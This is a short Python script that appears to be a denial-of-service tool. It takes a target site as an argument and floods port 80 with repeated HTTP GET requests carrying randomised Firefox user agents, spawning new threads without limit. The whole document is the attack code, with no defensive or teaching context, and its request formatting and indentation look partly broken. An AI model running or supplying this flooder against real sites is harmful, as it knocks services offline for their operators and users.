from threading import Thread
from random import choice
from fake_useragent import UserAgent
import socket 
import sys
import time
import os
ua = UserAgent()
red = "\033[91m"


data = '''
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 115
Connection: keep-alive'''

site = sys.argv[1]

def dos():
	while True:
		try:
			s = socket.socket()
			s.connect((site, 80))
			packet = str("GET / HTTP/1.1\nHost: "+site+"\n\n User-Agent: "+ua.firefox+"\n"+data).encode('utf-8')
			s.sendto(packet, (site, 80))	
			s.send(packet)
			print("\r"+red+time.ctime(time.time()) + ' >>>>> '+site)
		except socket.error:
			print("\r"+red+time.ctime(time.time()) + ' >>>>> '+site)
			exit(1)


Thread(target=dos).start()
while True:
	t = Thread(target=dos)
        t.start()